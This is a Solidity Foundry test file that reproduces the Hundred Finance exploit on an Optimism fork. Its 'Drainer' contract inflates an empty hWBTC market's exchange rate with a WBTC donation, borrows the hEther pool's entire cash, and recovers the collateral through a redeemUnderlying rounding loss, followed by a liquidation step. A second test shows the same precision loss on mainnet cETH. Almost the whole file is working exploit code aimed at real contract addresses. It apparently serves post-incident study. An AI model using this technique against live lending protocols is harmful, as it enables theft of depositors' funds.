// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.10;

import "forge-std/Test.sol";
import "../interface.sol";

interface IChainlinkPriceOracleProxy {
    function getUnderlyingPrice(address cToken) external view returns (uint);
}

contract HundredFinanceAttacker is Test {
    ICErc20 WBTC = ICErc20(0x68f180fcCe6836688e9084f035309E29Bf0A2095);
    ICErc20 hWBTC = ICErc20(0x35594E4992DFefcB0C20EC487d7af22a30bDec60);
    ICEther hEther = ICEther(0x1A61A72F5Cf5e857f15ee502210b81f8B3a66263);
    IComptroller comptroller = IComptroller(0x5a5755E1916F547D04eF43176d4cbe0de4503d5d);
    IChainlinkPriceOracleProxy priceOracle = IChainlinkPriceOracleProxy(0x10010069DE6bD5408A6dEd075Cf6ae2498073c73);

    function setUp() public {
        vm.label(address(WBTC), "WBTC");
        vm.label(address(hWBTC), "hWBTC");
        vm.label(address(hEther), "hEther");
        vm.label(address(comptroller), "Comptroller");
        vm.label(address(priceOracle), "ChainlinkPriceOracleProxy");
    }

    function testRedeemPrecisionLoss() external {
        // https://etherscan.io/tx/0x5a1b6484ed92777fa6f7a7d63c0ba032b81443835e2c3e89520899a2a0f3f6c5
        // 37.33289964 cETH -> 0.75 Ether
        address sender = 0x8e445422BaA49C7b98645E918577DE7D48280384;
        ICEther cETH = ICEther(0x4Ddc2D193948926D02f9B1fE9e1daa0718270ED5);
        vm.startPrank(sender);
        vm.createSelectFork("eth", 18328594);
        vm.roll(18328595);
        cETH.accrueInterest();

        uint256 exchangeRate = cETH.exchangeRateStored();
        emit log_named_uint("cETH exchangeRate", exchangeRate);

        uint256 cETHAmountIn = 3733289964;
        uint256 redeemAmountAccurate = cETHAmountIn * exchangeRate / 1e18;
        uint256 precisionLossMaxAmount = (cETHAmountIn + 1) * exchangeRate / 1e18;
        console.log("redeemAmountAccurate:", redeemAmountAccurate);
        console.log("precisionLossMaxAmount:", precisionLossMaxAmount);
        cETH.redeemUnderlying(precisionLossMaxAmount);
        // 37.33289964 cETH -> 0.750000000126279633 Ether
        vm.stopPrank();
    }

    function testEmpty() external {
        vm.createSelectFork("optimism", 89017326);
        uint256 totalSupply = hWBTC.totalSupply();
        console.log("empty market?", totalSupply == 0);
    }

    function info() public {
        uint256 underlyingBalance = hWBTC.getCash();
        uint256 totalBorrows = hWBTC.totalBorrows();
        uint256 totalReserves = hWBTC.totalReserves();
        uint256 totalSupply = hWBTC.totalSupply();
        uint256 exchangeRate = hWBTC.exchangeRateStored();
        emit log_named_uint("hWBTC underlyingBalance", underlyingBalance);
        emit log_named_uint("hWBTC totalBorrows", totalBorrows);
        emit log_named_uint("hWBTC totalReserves", totalReserves);
        emit log_named_uint("hWBTC totalSupply", totalSupply);
        emit log_named_uint("hWBTC exchangeRate", exchangeRate);
    }

    function testExploit() external {
        uint256 blockNumber = 89017326; // before the attacker's first mint
        vm.createSelectFork("optimism", blockNumber);
        deal(address(WBTC), address(this), 800*1e8);
        deal(address(this), 0);  // https://twitter.com/TheBlockChainer/status/1727309850810392771
        console.log("before attack");
        emit log_named_decimal_uint("ETH balance", address(this).balance, 18);
        emit log_named_decimal_uint("WBTC balance", WBTC.balanceOf(address(this)), WBTC.decimals());

        uint256 _salt = uint256(keccak256(abi.encodePacked(uint256(0))));
        bytes memory bytecode = type(Drainer).creationCode;
        bytes memory contractBytecode = abi.encodePacked(bytecode, abi.encode(address(hEther)));
        address DrainAddress = address(uint160(uint256(keccak256(abi.encodePacked(bytes1(0xff), address(this), _salt, keccak256(contractBytecode))))));

        WBTC.transfer(DrainAddress, WBTC.balanceOf(address(this)));
        Drainer drainer = new Drainer{salt: bytes32(_salt)}(hEther);  // drain the hETH pool

        uint256 exchangeRate = hWBTC.exchangeRateStored();
        uint256 liquidationIncentiveMantissa = 1080000000000000000;
        uint256 priceBorrowedMantissa = priceOracle.getUnderlyingPrice(address(hEther));
        uint256 priceCollateralMantissa = priceOracle.getUnderlyingPrice(address(hWBTC));
        uint256 hTokenAmount = 1;
        uint256 liquidateAmount = 1e18/(priceBorrowedMantissa * liquidationIncentiveMantissa / (exchangeRate * hTokenAmount * priceCollateralMantissa / 1e18)) + 1;
        hEther.liquidateBorrow{value: liquidateAmount}(address(drainer), address(hWBTC)); // liquidate to get the 1 hWBTC
        hWBTC.redeem(1); // redeem to recover the empty market

        console.log("after attack");
        emit log_named_decimal_uint("ETH balance", address(this).balance, 18);
        emit log_named_decimal_uint("WBTC balance", WBTC.balanceOf(address(this)), WBTC.decimals());
    }

    receive() external payable {}
}

contract Drainer is Test {
    ICErc20 WBTC = ICErc20(0x68f180fcCe6836688e9084f035309E29Bf0A2095);
    ICErc20 hWBTC = ICErc20(0x35594E4992DFefcB0C20EC487d7af22a30bDec60);
    IComptroller comptroller = IComptroller(0x5a5755E1916F547D04eF43176d4cbe0de4503d5d);
    ICEther hEther;

    constructor(ICEther token) payable {
        hEther = token;
        WBTC.approve(address(hWBTC), type(uint256).max);
        hWBTC.mint(1 * 1e8);
        // hWBTC.redeem(hWBTC.totalSupply() - 1);
        hWBTC.redeem(hWBTC.totalSupply() - 2);  // get 2 hWBTC, the totalSupply is 2

        uint256 donationAmount = WBTC.balanceOf(address(this));
        WBTC.transfer(address(hWBTC), donationAmount);
        console.log("donationAmount:", donationAmount);

        address[] memory cTokens = new address[](1);
        cTokens[0] = address(hWBTC);
        comptroller.enterMarkets(cTokens);

        uint256 cWBTCAmountIn = 1;
        uint256 exchangeRate = hWBTC.exchangeRateStored();
        uint256 precisionLossMaxAmount = (cWBTCAmountIn + 1) * exchangeRate / 1e18;
        console.log("precisionLossMaxAmount:", precisionLossMaxAmount);

        uint256 borrowAmount = hEther.getCash();
        hEther.borrow(borrowAmount); // using cWBTC as collateral to lend ETH
        payable(address(msg.sender)).transfer(address(this).balance);

        uint256 redeemAmount;
        if (precisionLossMaxAmount > donationAmount) {
            redeemAmount = donationAmount;
        } else {
            redeemAmount = precisionLossMaxAmount;
        }
        console.log("redeemAmount:", redeemAmount);
        hWBTC.redeemUnderlying(redeemAmount);  // due to precision loss, only 1hWBTC was used to redeem all WBTCs
        
        WBTC.transfer(msg.sender, WBTC.balanceOf(address(this)));
    }
}
